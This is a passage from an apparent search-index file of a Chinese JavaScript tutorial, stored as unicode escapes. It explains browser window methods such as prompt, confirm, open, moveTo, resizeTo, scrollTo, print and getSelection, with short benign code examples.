\u4e0a\u9762\u4ee3\u7801\u4f1a\u8df3\u51fa\u4e00\u4e2a\u5bf9\u8bdd\u6846\uff0c\u6587\u5b57\u63d0\u793a\u4e3a\u201c\u60a8\u7684\u5e74\u9f84\uff1f\u201d\uff0c\u8981\u6c42\u7528\u6237\u5728\u5bf9\u8bdd\u6846\u4e2d\u8f93\u5165\u81ea\u5df1\u7684\u5e74\u9f84\uff08\u9ed8\u8ba4\u663e\u793a25\uff09\u3002\u7528\u6237\u586b\u5165\u7684\u503c\uff0c\u4f1a\u4f5c\u4e3a\u8fd4\u56de\u503c\u5b58\u5165\u53d8\u91cf result \u3002 window.prompt() \u7684\u8fd4\u56de\u503c\u6709\u4e24\u79cd\u60c5\u51b5\uff0c\u53ef\u80fd\u662f\u5b57\u7b26\u4e32\uff08\u6709\u53ef\u80fd\u662f\u7a7a\u5b57\u7b26\u4e32\uff09\uff0c\u4e5f\u6709\u53ef\u80fd\u662f null \u3002\u5177\u4f53\u5206\u6210\u4e09\u79cd\u60c5\u51b5\u3002 \u7528\u6237\u8f93\u5165\u4fe1\u606f\uff0c\u5e76\u70b9\u51fb\u201c\u786e\u5b9a\u201d\uff0c\u5219\u7528\u6237\u8f93\u5165\u7684\u4fe1\u606f\u5c31\u662f\u8fd4\u56de\u503c\u3002 \u7528\u6237\u6ca1\u6709\u8f93\u5165\u4fe1\u606f\uff0c\u76f4\u63a5\u70b9\u51fb\u201c\u786e\u5b9a\u201d\uff0c\u5219\u8f93\u5165\u6846\u7684\u9ed8\u8ba4\u503c\u5c31\u662f\u8fd4\u56de\u503c\u3002 \u7528\u6237\u70b9\u51fb\u4e86\u201c\u53d6\u6d88\u201d\uff08\u6216\u8005\u6309\u4e86 ESC \u6309\u94ae\uff09\uff0c\u5219\u8fd4\u56de\u503c\u662f null \u3002 window.prompt() \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u4f46\u662f\u6700\u597d\u603b\u662f\u63d0\u4f9b\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u4f5c\u4e3a\u8f93\u5165\u6846\u7684\u9ed8\u8ba4\u503c\u3002 \uff083\uff09window.confirm() window.confirm() \u65b9\u6cd5\u5f39\u51fa\u7684\u5bf9\u8bdd\u6846\uff0c\u9664\u4e86\u63d0\u793a\u4fe1\u606f\u4e4b\u5916\uff0c\u53ea\u6709\u201c\u786e\u5b9a\u201d\u548c\u201c\u53d6\u6d88\u201d\u4e24\u4e2a\u6309\u94ae\uff0c\u5f80\u5f80\u7528\u6765\u5f81\u8be2\u7528\u6237\u662f\u5426\u540c\u610f\u3002 1 var result = confirm ( '\u4f60\u6700\u8fd1\u597d\u5417\uff1f' ); \u4e0a\u9762\u4ee3\u7801\u5f39\u51fa\u4e00\u4e2a\u5bf9\u8bdd\u6846\uff0c\u4e0a\u9762\u53ea\u6709\u4e00\u884c\u6587\u5b57\u201c\u4f60\u6700\u8fd1\u597d\u5417\uff1f\u201d\uff0c\u7528\u6237\u9009\u62e9\u70b9\u51fb\u201c\u786e\u5b9a\u201d\u6216\u201c\u53d6\u6d88\u201d\u3002 confirm \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u5982\u679c\u7528\u6237\u70b9\u51fb\u201c\u786e\u5b9a\u201d\uff0c\u8fd4\u56de true \uff1b\u5982\u679c\u7528\u6237\u70b9\u51fb\u201c\u53d6\u6d88\u201d\uff0c\u5219\u8fd4\u56de false \u3002 1 2 3 4 5 6 var okay = confirm ( 'Please confirm this message.' ); if ( okay ) { // \u7528\u6237\u6309\u4e0b\u201c\u786e\u5b9a\u201d } else { // \u7528\u6237\u6309\u4e0b\u201c\u53d6\u6d88\u201d } confirm \u7684\u4e00\u4e2a\u7528\u9014\u662f\uff0c\u7528\u6237\u79bb\u5f00\u5f53\u524d\u9875\u9762\u65f6\uff0c\u5f39\u51fa\u4e00\u4e2a\u5bf9\u8bdd\u6846\uff0c\u95ee\u7528\u6237\u662f\u5426\u771f\u7684\u8981\u79bb\u5f00\u3002 1 2 3 window . onunload = function () { return window . confirm ( '\u4f60\u786e\u5b9a\u8981\u79bb\u5f00\u5f53\u9762\u9875\u9762\u5417\uff1f' ); } \u8fd9\u4e09\u4e2a\u65b9\u6cd5\u90fd\u5177\u6709\u5835\u585e\u6548\u5e94\uff0c\u4e00\u65e6\u5f39\u51fa\u5bf9\u8bdd\u6846\uff0c\u6574\u4e2a\u9875\u9762\u5c31\u662f\u6682\u505c\u6267\u884c\uff0c\u7b49\u5f85\u7528\u6237\u505a\u51fa\u53cd\u5e94\u3002","title":"window.alert()\uff0cwindow.prompt()\uff0cwindow.confirm()"},{"location":"bom/window/#windowopen-windowclosewindowstop","text":"\uff081\uff09window.open() window.open \u65b9\u6cd5\u7528\u4e8e\u65b0\u5efa\u53e6\u4e00\u4e2a\u6d4f\u89c8\u5668\u7a97\u53e3\uff0c\u7c7b\u4f3c\u4e8e\u6d4f\u89c8\u5668\u83dc\u5355\u7684\u65b0\u5efa\u7a97\u53e3\u9009\u9879\u3002\u5b83\u4f1a\u8fd4\u56de\u65b0\u7a97\u53e3\u7684\u5f15\u7528\uff0c\u5982\u679c\u65e0\u6cd5\u65b0\u5efa\u7a97\u53e3\uff0c\u5219\u8fd4\u56de null \u3002 1 var popup = window . open ( 'somefile.html' ); \u4e0a\u9762\u4ee3\u7801\u4f1a\u8ba9\u6d4f\u89c8\u5668\u5f39\u51fa\u4e00\u4e2a\u65b0\u5efa\u7a97\u53e3\uff0c\u7f51\u5740\u662f\u5f53\u524d\u57df\u540d\u4e0b\u7684 somefile.html \u3002 open \u65b9\u6cd5\u4e00\u5171\u53ef\u4ee5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\u3002 1 window . open ( url , windowName , [ windowFeatures ]) url \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u65b0\u7a97\u53e3\u7684\u7f51\u5740\u3002\u5982\u679c\u7701\u7565\uff0c\u9ed8\u8ba4\u7f51\u5740\u5c31\u662f about:blank \u3002 windowName \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u65b0\u7a97\u53e3\u7684\u540d\u5b57\u3002\u5982\u679c\u8be5\u540d\u5b57\u7684\u7a97\u53e3\u5df2\u7ecf\u5b58\u5728\uff0c\u5219\u5360\u7528\u8be5\u7a97\u53e3\uff0c\u4e0d\u518d\u65b0\u5efa\u7a97\u53e3\u3002\u5982\u679c\u7701\u7565\uff0c\u5c31\u9ed8\u8ba4\u4f7f\u7528 _blank \uff0c\u8868\u793a\u65b0\u5efa\u4e00\u4e2a\u6ca1\u6709\u540d\u5b57\u7684\u7a97\u53e3\u3002\u53e6\u5916\u8fd8\u6709\u51e0\u4e2a\u9884\u8bbe\u503c\uff0c _self \u8868\u793a\u5f53\u524d\u7a97\u53e3\uff0c _top \u8868\u793a\u9876\u5c42\u7a97\u53e3\uff0c _parent \u8868\u793a\u4e0a\u4e00\u5c42\u7a97\u53e3\u3002 windowFeatures \uff1a\u5b57\u7b26\u4e32\uff0c\u5185\u5bb9\u4e3a\u9017\u53f7\u5206\u9694\u7684\u952e\u503c\u5bf9\uff08\u8be6\u89c1\u4e0b\u6587\uff09\uff0c\u8868\u793a\u65b0\u7a97\u53e3\u7684\u53c2\u6570\uff0c\u6bd4\u5982\u6709\u6ca1\u6709\u63d0\u793a\u680f\u3001\u5de5\u5177\u6761\u7b49\u7b49\u3002\u5982\u679c\u7701\u7565\uff0c\u5219\u9ed8\u8ba4\u6253\u5f00\u4e00\u4e2a\u5b8c\u6574 UI \u7684\u65b0\u7a97\u53e3\u3002\u5982\u679c\u65b0\u5efa\u7684\u662f\u4e00\u4e2a\u5df2\u7ecf\u5b58\u5728\u7684\u7a97\u53e3\uff0c\u5219\u8be5\u53c2\u6570\u4e0d\u8d77\u4f5c\u7528\uff0c\u6d4f\u89c8\u5668\u6cbf\u7528\u4ee5\u524d\u7a97\u53e3\u7684\u53c2\u6570\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 var popup = window . open ( 'somepage.html' , 'DefinitionsWindows' , 'height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes' ); \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u6253\u5f00\u7684\u65b0\u7a97\u53e3\u9ad8\u5ea6\u548c\u5bbd\u5ea6\u90fd\u4e3a200\u50cf\u7d20\uff0c\u6ca1\u6709\u5730\u5740\u680f\uff0c\u4f46\u6709\u72b6\u6001\u680f\u548c\u6eda\u52a8\u6761\uff0c\u5141\u8bb8\u7528\u6237\u8c03\u6574\u5927\u5c0f\u3002 \u7b2c\u4e09\u4e2a\u53c2\u6570\u53ef\u4ee5\u8bbe\u5b9a\u5982\u4e0b\u5c5e\u6027\u3002 left\uff1a\u65b0\u7a97\u53e3\u8ddd\u79bb\u5c4f\u5e55\u6700\u5de6\u8fb9\u7684\u8ddd\u79bb\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u6ce8\u610f\uff0c\u65b0\u7a97\u53e3\u5fc5\u987b\u662f\u53ef\u89c1\u7684\uff0c\u4e0d\u80fd\u8bbe\u7f6e\u5728\u5c4f\u5e55\u4ee5\u5916\u7684\u4f4d\u7f6e\u3002 top\uff1a\u65b0\u7a97\u53e3\u8ddd\u79bb\u5c4f\u5e55\u6700\u9876\u90e8\u7684\u8ddd\u79bb\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002 height\uff1a\u65b0\u7a97\u53e3\u5185\u5bb9\u533a\u57df\u7684\u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u4e0d\u5f97\u5c0f\u4e8e100\u3002 width\uff1a\u65b0\u7a97\u53e3\u5185\u5bb9\u533a\u57df\u7684\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u4e0d\u5f97\u5c0f\u4e8e100\u3002 outerHeight\uff1a\u6574\u4e2a\u6d4f\u89c8\u5668\u7a97\u53e3\u7684\u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u4e0d\u5f97\u5c0f\u4e8e100\u3002 outerWidth\uff1a\u6574\u4e2a\u6d4f\u89c8\u5668\u7a97\u53e3\u7684\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u4e0d\u5f97\u5c0f\u4e8e100\u3002 menubar\uff1a\u662f\u5426\u663e\u793a\u83dc\u5355\u680f\u3002 toolbar\uff1a\u662f\u5426\u663e\u793a\u5de5\u5177\u680f\u3002 location\uff1a\u662f\u5426\u663e\u793a\u5730\u5740\u680f\u3002 personalbar\uff1a\u662f\u5426\u663e\u793a\u7528\u6237\u81ea\u5df1\u5b89\u88c5\u7684\u5de5\u5177\u680f\u3002 status\uff1a\u662f\u5426\u663e\u793a\u72b6\u6001\u680f\u3002 dependent\uff1a\u662f\u5426\u4f9d\u8d56\u7236\u7a97\u53e3\u3002\u5982\u679c\u4f9d\u8d56\uff0c\u90a3\u4e48\u7236\u7a97\u53e3\u6700\u5c0f\u5316\uff0c\u8be5\u7a97\u53e3\u4e5f\u6700\u5c0f\u5316\uff1b\u7236\u7a97\u53e3\u5173\u95ed\uff0c\u8be5\u7a97\u53e3\u4e5f\u5173\u95ed\u3002 minimizable\uff1a\u662f\u5426\u6709\u6700\u5c0f\u5316\u6309\u94ae\uff0c\u524d\u63d0\u662f dialog=yes \u3002 noopener\uff1a\u65b0\u7a97\u53e3\u5c06\u4e0e\u7236\u7a97\u53e3\u5207\u65ad\u8054\u7cfb\uff0c\u5373\u65b0\u7a97\u53e3\u7684 window.opener \u5c5e\u6027\u8fd4\u56de null \uff0c\u7236\u7a97\u53e3\u7684 window.open() \u65b9\u6cd5\u4e5f\u8fd4\u56de null \u3002 resizable\uff1a\u65b0\u7a97\u53e3\u662f\u5426\u53ef\u4ee5\u8c03\u8282\u5927\u5c0f\u3002 scrollbars\uff1a\u662f\u5426\u5141\u8bb8\u65b0\u7a97\u53e3\u51fa\u73b0\u6eda\u52a8\u6761\u3002 dialog\uff1a\u65b0\u7a97\u53e3\u6807\u9898\u680f\u662f\u5426\u51fa\u73b0\u6700\u5927\u5316\u3001\u6700\u5c0f\u5316\u3001\u6062\u590d\u539f\u59cb\u5927\u5c0f\u7684\u63a7\u4ef6\u3002 titlebar\uff1a\u65b0\u7a97\u53e3\u662f\u5426\u663e\u793a\u6807\u9898\u680f\u3002 alwaysRaised\uff1a\u662f\u5426\u663e\u793a\u5728\u6240\u6709\u7a97\u53e3\u7684\u9876\u90e8\u3002 alwaysLowered\uff1a\u662f\u5426\u663e\u793a\u5728\u7236\u7a97\u53e3\u7684\u5e95\u4e0b\u3002 close\uff1a\u65b0\u7a97\u53e3\u662f\u5426\u663e\u793a\u5173\u95ed\u6309\u94ae\u3002 \u5bf9\u4e8e\u90a3\u4e9b\u53ef\u4ee5\u6253\u5f00\u548c\u5173\u95ed\u7684\u5c5e\u6027\uff0c\u8bbe\u4e3a yes \u6216 1 \u6216\u4e0d\u8bbe\u4efb\u4f55\u503c\u5c31\u8868\u793a\u6253\u5f00\uff0c\u6bd4\u5982 status=yes \u3001 status=1 \u3001 status \u90fd\u4f1a\u5f97\u5230\u540c\u6837\u7684\u7ed3\u679c\u3002\u5982\u679c\u60f3\u8bbe\u4e3a\u5173\u95ed\uff0c\u4e0d\u7528\u5199 no \uff0c\u800c\u662f\u76f4\u63a5\u7701\u7565\u8fd9\u4e2a\u5c5e\u6027\u5373\u53ef\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u5728\u7b2c\u4e09\u4e2a\u53c2\u6570\u4e2d\u8bbe\u7f6e\u4e86\u4e00\u90e8\u5206\u5c5e\u6027\uff0c\u5176\u4ed6\u6ca1\u6709\u88ab\u8bbe\u7f6e\u7684 yes/no \u5c5e\u6027\u90fd\u4f1a\u88ab\u8bbe\u6210 no \uff0c\u53ea\u6709 titlebar \u548c\u5173\u95ed\u6309\u94ae\u9664\u5916\uff08\u5b83\u4eec\u7684\u503c\u9ed8\u8ba4\u4e3a yes \uff09\u3002 \u4e0a\u9762\u8fd9\u4e9b\u5c5e\u6027\uff0c\u5c5e\u6027\u540d\u4e0e\u5c5e\u6027\u503c\u4e4b\u95f4\u7528\u7b49\u53f7\u8fde\u63a5\uff0c\u5c5e\u6027\u4e0e\u5c5e\u6027\u4e4b\u95f4\u7528\u9017\u53f7\u5206\u9694\u3002 1 'height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes' \u53e6\u5916\uff0c open() \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u867d\u7136\u53ef\u4ee5\u6307\u5b9a\u5df2\u7ecf\u5b58\u5728\u7684\u7a97\u53e3\uff0c\u4f46\u662f\u4e0d\u7b49\u4e8e\u53ef\u4ee5\u4efb\u610f\u63a7\u5236\u5176\u4ed6\u7a97\u53e3\u3002\u4e3a\u4e86\u9632\u6b62\u88ab\u4e0d\u76f8\u5e72\u7684\u7a97\u53e3\u63a7\u5236\uff0c\u6d4f\u89c8\u5668\u53ea\u6709\u5728\u4e24\u4e2a\u7a97\u53e3\u540c\u6e90\uff0c\u6216\u8005\u76ee\u6807\u7a97\u53e3\u88ab\u5f53\u524d\u7f51\u9875\u6253\u5f00\u7684\u60c5\u51b5\u4e0b\uff0c\u624d\u5141\u8bb8 open \u65b9\u6cd5\u6307\u5411\u8be5\u7a97\u53e3\u3002 window.open \u65b9\u6cd5\u8fd4\u56de\u65b0\u7a97\u53e3\u7684\u5f15\u7528\u3002 1 2 var windowB = window . open ( 'windowB.html' , 'WindowB' ); windowB . window . name // \"WindowB\" \u6ce8\u610f\uff0c\u5982\u679c\u65b0\u7a97\u53e3\u548c\u7236\u7a97\u53e3\u4e0d\u662f\u540c\u6e90\u7684\uff08\u5373\u4e0d\u5728\u540c\u4e00\u4e2a\u57df\uff09\uff0c\u5b83\u4eec\u5f7c\u6b64\u4e0d\u80fd\u83b7\u53d6\u5bf9\u65b9\u7a97\u53e3\u5bf9\u8c61\u7684\u5185\u90e8\u5c5e\u6027\u3002 \u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 var w = window . open (); console . log ( '\u5df2\u7ecf\u6253\u5f00\u65b0\u7a97\u53e3' ); w . location = 'http://example.com' ; \u4e0a\u9762\u4ee3\u7801\u5148\u6253\u5f00\u4e00\u4e2a\u65b0\u7a97\u53e3\uff0c\u7136\u540e\u5728\u8be5\u7a97\u53e3\u5f39\u51fa\u4e00\u4e2a\u5bf9\u8bdd\u6846\uff0c\u518d\u5c06\u7f51\u5740\u5bfc\u5411 example.com \u3002 \u7531\u4e8e open \u8fd9\u4e2a\u65b9\u6cd5\u5f88\u5bb9\u6613\u88ab\u6ee5\u7528\uff0c\u8bb8\u591a\u6d4f\u89c8\u5668\u9ed8\u8ba4\u90fd\u4e0d\u5141\u8bb8\u811a\u672c\u81ea\u52a8\u65b0\u5efa\u7a97\u53e3\u3002\u53ea\u5141\u8bb8\u5728\u7528\u6237\u70b9\u51fb\u94fe\u63a5\u6216\u6309\u94ae\u65f6\uff0c\u811a\u672c\u505a\u51fa\u53cd\u5e94\uff0c\u5f39\u51fa\u65b0\u7a97\u53e3\u3002\u56e0\u6b64\uff0c\u6709\u5fc5\u8981\u68c0\u67e5\u4e00\u4e0b\u6253\u5f00\u65b0\u7a97\u53e3\u662f\u5426\u6210\u529f\u3002 1 2 3 4 var popup = window . open (); if ( popup === null ) { // \u65b0\u5efa\u7a97\u53e3\u5931\u8d25 } \uff082\uff09window.close() window.close \u65b9\u6cd5\u7528\u4e8e\u5173\u95ed\u5f53\u524d\u7a97\u53e3\uff0c\u4e00\u822c\u53ea\u7528\u6765\u5173\u95ed window.open \u65b9\u6cd5\u65b0\u5efa\u7684\u7a97\u53e3\u3002 1 popup . close () \u8be5\u65b9\u6cd5\u53ea\u5bf9\u9876\u5c42\u7a97\u53e3\u6709\u6548\uff0c iframe \u6846\u67b6\u4e4b\u4e2d\u7684\u7a97\u53e3\u4f7f\u7528\u8be5\u65b9\u6cd5\u65e0\u6548\u3002 \uff083\uff09window.stop() window.stop() \u65b9\u6cd5\u5b8c\u5168\u7b49\u540c\u4e8e\u5355\u51fb\u6d4f\u89c8\u5668\u7684\u505c\u6b62\u6309\u94ae\uff0c\u4f1a\u505c\u6b62\u52a0\u8f7d\u56fe\u50cf\u3001\u89c6\u9891\u7b49\u6b63\u5728\u6216\u7b49\u5f85\u52a0\u8f7d\u7684\u5bf9\u8c61\u3002 1 window . stop ()","title":"window.open(), window.close()\uff0cwindow.stop()"},{"location":"bom/window/#windowmovetowindowmoveby","text":"window.moveTo() \u65b9\u6cd5\u7528\u4e8e\u79fb\u52a8\u6d4f\u89c8\u5668\u7a97\u53e3\u5230\u6307\u5b9a\u4f4d\u7f6e\u3002\u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u5206\u522b\u662f\u7a97\u53e3\u5de6\u4e0a\u89d2\u8ddd\u79bb\u5c4f\u5e55\u5de6\u4e0a\u89d2\u7684\u6c34\u5e73\u8ddd\u79bb\u548c\u5782\u76f4\u8ddd\u79bb\uff0c\u5355\u4f4d\u4e3a\u50cf\u7d20\u3002 1 window . moveTo ( 100 , 200 ) \u4e0a\u9762\u4ee3\u7801\u5c06\u7a97\u53e3\u79fb\u52a8\u5230\u5c4f\u5e55 (100, 200) \u7684\u4f4d\u7f6e\u3002 window.moveBy() \u65b9\u6cd5\u5c06\u7a97\u53e3\u79fb\u52a8\u5230\u4e00\u4e2a\u76f8\u5bf9\u4f4d\u7f6e\u3002\u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u5206\u522b\u662f\u7a97\u53e3\u5de6\u4e0a\u89d2\u5411\u53f3\u79fb\u52a8\u7684\u6c34\u5e73\u8ddd\u79bb\u548c\u5411\u4e0b\u79fb\u52a8\u7684\u5782\u76f4\u8ddd\u79bb\uff0c\u5355\u4f4d\u4e3a\u50cf\u7d20\u3002 1 window . moveBy ( 25 , 50 ) \u4e0a\u9762\u4ee3\u7801\u5c06\u7a97\u53e3\u5411\u53f3\u79fb\u52a825\u50cf\u7d20\u3001\u5411\u4e0b\u79fb\u52a850\u50cf\u7d20\u3002 \u4e3a\u4e86\u9632\u6b62\u6709\u4eba\u6ee5\u7528\u8fd9\u4e24\u4e2a\u65b9\u6cd5\uff0c\u968f\u610f\u79fb\u52a8\u7528\u6237\u7684\u7a97\u53e3\uff0c\u76ee\u524d\u53ea\u6709\u4e00\u79cd\u60c5\u51b5\uff0c\u6d4f\u89c8\u5668\u5141\u8bb8\u7528\u811a\u672c\u79fb\u52a8\u7a97\u53e3\uff1a\u8be5\u7a97\u53e3\u662f\u7528 window.open() \u65b9\u6cd5\u65b0\u5efa\u7684\uff0c\u5e76\u4e14\u7a97\u53e3\u91cc\u53ea\u6709\u5b83\u4e00\u4e2a Tab \u9875\u3002\u9664\u6b64\u4ee5\u5916\u7684\u60c5\u51b5\uff0c\u4f7f\u7528\u4e0a\u9762\u4e24\u4e2a\u65b9\u6cd5\u90fd\u662f\u65e0\u6548\u7684\u3002","title":"window.moveTo()\uff0cwindow.moveBy()"},{"location":"bom/window/#windowresizetowindowresizeby","text":"window.resizeTo() \u65b9\u6cd5\u7528\u4e8e\u7f29\u653e\u7a97\u53e3\u5230\u6307\u5b9a\u5927\u5c0f\u3002 \u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u7f29\u653e\u540e\u7684\u7a97\u53e3\u5bbd\u5ea6\uff08 outerWidth \u5c5e\u6027\uff0c\u5305\u542b\u6eda\u52a8\u6761\u3001\u6807\u9898\u680f\u7b49\u7b49\uff09\uff0c\u7b2c\u4e8c\u4e2a\u662f\u7f29\u653e\u540e\u7684\u7a97\u53e3\u9ad8\u5ea6\uff08 outerHeight \u5c5e\u6027\uff09\u3002 1 2 3 4 window . resizeTo ( window . screen . availWidth / 2 , window . screen . availHeight / 2 ) \u4e0a\u9762\u4ee3\u7801\u5c06\u5f53\u524d\u7a97\u53e3\u7f29\u653e\u5230\uff0c\u5c4f\u5e55\u53ef\u7528\u533a\u57df\u7684\u4e00\u534a\u5bbd\u5ea6\u548c\u9ad8\u5ea6\u3002 window.resizeBy() \u65b9\u6cd5\u7528\u4e8e\u7f29\u653e\u7a97\u53e3\u3002\u5b83\u4e0e window.resizeTo() \u7684\u533a\u522b\u662f\uff0c\u5b83\u6309\u7167\u76f8\u5bf9\u7684\u91cf\u7f29\u653e\uff0c window.resizeTo() \u9700\u8981\u7ed9\u51fa\u7f29\u653e\u540e\u7684\u7edd\u5bf9\u5927\u5c0f\u3002 \u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u6c34\u5e73\u7f29\u653e\u7684\u91cf\uff0c\u7b2c\u4e8c\u4e2a\u662f\u5782\u76f4\u7f29\u653e\u7684\u91cf\uff0c\u5355\u4f4d\u90fd\u662f\u50cf\u7d20\u3002 1 window . resizeBy ( - 200 , - 200 ) \u4e0a\u9762\u7684\u4ee3\u7801\u5c06\u5f53\u524d\u7a97\u53e3\u7684\u5bbd\u5ea6\u548c\u9ad8\u5ea6\uff0c\u90fd\u7f29\u5c0f200\u50cf\u7d20\u3002","title":"window.resizeTo()\uff0cwindow.resizeBy()"},{"location":"bom/window/#windowscrolltowindowscrollwindowscrollby","text":"window.scrollTo \u65b9\u6cd5\u7528\u4e8e\u5c06\u6587\u6863\u6eda\u52a8\u5230\u6307\u5b9a\u4f4d\u7f6e\u3002\u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u6eda\u52a8\u540e\u4f4d\u4e8e\u7a97\u53e3\u5de6\u4e0a\u89d2\u7684\u9875\u9762\u5750\u6807\u3002 1 window . scrollTo ( x - coord , y - coord ) \u5b83\u4e5f\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u914d\u7f6e\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u3002 1 window . scrollTo ( options ) \u914d\u7f6e\u5bf9\u8c61 options \u6709\u4e09\u4e2a\u5c5e\u6027\u3002 top \uff1a\u6eda\u52a8\u540e\u9875\u9762\u5de6\u4e0a\u89d2\u7684\u5782\u76f4\u5750\u6807\uff0c\u5373 y \u5750\u6807\u3002 left \uff1a\u6eda\u52a8\u540e\u9875\u9762\u5de6\u4e0a\u89d2\u7684\u6c34\u5e73\u5750\u6807\uff0c\u5373 x \u5750\u6807\u3002 behavior \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6eda\u52a8\u7684\u65b9\u5f0f\uff0c\u6709\u4e09\u4e2a\u53ef\u80fd\u503c\uff08 smooth \u3001 instant \u3001 auto \uff09\uff0c\u9ed8\u8ba4\u503c\u4e3a auto \u3002 1 2 3 4 window . scrollTo ({ top : 1000 , behavior : 'smooth' }); window.scroll() \u65b9\u6cd5\u662f window.scrollTo() \u65b9\u6cd5\u7684\u522b\u540d\u3002 window.scrollBy() \u65b9\u6cd5\u7528\u4e8e\u5c06\u7f51\u9875\u6eda\u52a8\u6307\u5b9a\u8ddd\u79bb\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff1a\u6c34\u5e73\u5411\u53f3\u6eda\u52a8\u7684\u50cf\u7d20\uff0c\u5782\u76f4\u5411\u4e0b\u6eda\u52a8\u7684\u50cf\u7d20\u3002 1 window . scrollBy ( 0 , window . innerHeight ) \u4e0a\u9762\u4ee3\u7801\u7528\u4e8e\u5c06\u7f51\u9875\u5411\u4e0b\u6eda\u52a8\u4e00\u5c4f\u3002 \u5982\u679c\u4e0d\u662f\u8981\u6eda\u52a8\u6574\u4e2a\u6587\u6863\uff0c\u800c\u662f\u8981\u6eda\u52a8\u67d0\u4e2a\u5143\u7d20\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u4e09\u4e2a\u5c5e\u6027\u548c\u65b9\u6cd5\u3002 Element.scrollTop Element.scrollLeft Element.scrollIntoView()","title":"window.scrollTo()\uff0cwindow.scroll()\uff0cwindow.scrollBy()"},{"location":"bom/window/#windowprint","text":"window.print \u65b9\u6cd5\u4f1a\u8df3\u51fa\u6253\u5370\u5bf9\u8bdd\u6846\uff0c\u4e0e\u7528\u6237\u70b9\u51fb\u83dc\u5355\u91cc\u9762\u7684\u201c\u6253\u5370\u201d\u547d\u4ee4\u6548\u679c\u76f8\u540c\u3002 \u5e38\u89c1\u7684\u6253\u5370\u6309\u94ae\u4ee3\u7801\u5982\u4e0b\u3002 1 2 3 document . getElementById ( 'printLink' ). onclick = function () { window . print (); } \u975e\u684c\u9762\u8bbe\u5907\uff08\u6bd4\u5982\u624b\u673a\uff09\u53ef\u80fd\u6ca1\u6709\u6253\u5370\u529f\u80fd\uff0c\u8fd9\u65f6\u53ef\u4ee5\u8fd9\u6837\u5224\u65ad\u3002 1 2 3 if ( typeof window . print === 'function' ) { // \u652f\u6301\u6253\u5370\u529f\u80fd }","title":"window.print()"},{"location":"bom/window/#windowfocuswindowblur","text":"window.focus() \u65b9\u6cd5\u4f1a\u6fc0\u6d3b\u7a97\u53e3\uff0c\u4f7f\u5176\u83b7\u5f97\u7126\u70b9\uff0c\u51fa\u73b0\u5728\u5176\u4ed6\u7a97\u53e3\u7684\u524d\u9762\u3002 1 2 3 4 5 var popup = window . open ( 'popup.html' , 'Popup Window' ); if (( popup !== null ) && ! popup . closed ) { popup . focus (); } \u4e0a\u9762\u4ee3\u7801\u5148\u68c0\u67e5 popup \u7a97\u53e3\u662f\u5426\u4f9d\u7136\u5b58\u5728\uff0c\u786e\u8ba4\u540e\u6fc0\u6d3b\u8be5\u7a97\u53e3\u3002 window.blur() \u65b9\u6cd5\u5c06\u7126\u70b9\u4ece\u7a97\u53e3\u79fb\u9664\u3002 \u5f53\u524d\u7a97\u53e3\u83b7\u5f97\u7126\u70b9\u65f6\uff0c\u4f1a\u89e6\u53d1 focus \u4e8b\u4ef6\uff1b\u5f53\u524d\u7a97\u53e3\u5931\u53bb\u7126\u70b9\u65f6\uff0c\u4f1a\u89e6\u53d1 blur \u4e8b\u4ef6\u3002","title":"window.focus()\uff0cwindow.blur()"},{"location":"bom/window/#windowgetselection","text":"window.getSelection \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a Selection \u5bf9\u8c61\uff0c\u8868\u793a\u7528\u6237\u73b0\u5728\u9009\u4e2d\u7684\u6587\u672c\u3002 1 var selObj = window . getSelection (); \u4f7f\u7528 Selection \u5bf9\u8c61\u7684 toString \u65b9\u6cd5\u53ef\u4ee5\u5f97\u5230\u9009\u4e2d\u7684\u6587\u672c\u3002 1 var selectedText = selObj . toString ();","title":"window.getSelection()"},{"location":"bom/window/#windowgetcomputedstylewindowmatchmedia","text":"window.getComputedStyle() \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u5143\u7d20\u8282\u70b9\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u8be5\u5143\u7d20\u7684\u6700\u7ec8\u6837\u5f0f\u4fe1\u606f\u7684\u5bf9\u8c61\uff0c\u8be6\u89c1\u300aCSS \u64cd\u4f5c\u300b\u4e00\u7ae0\u3002 window.matchMedia() \u65b9\u6cd5\u7528\u6765\u68c0\u67e5 CSS \u7684 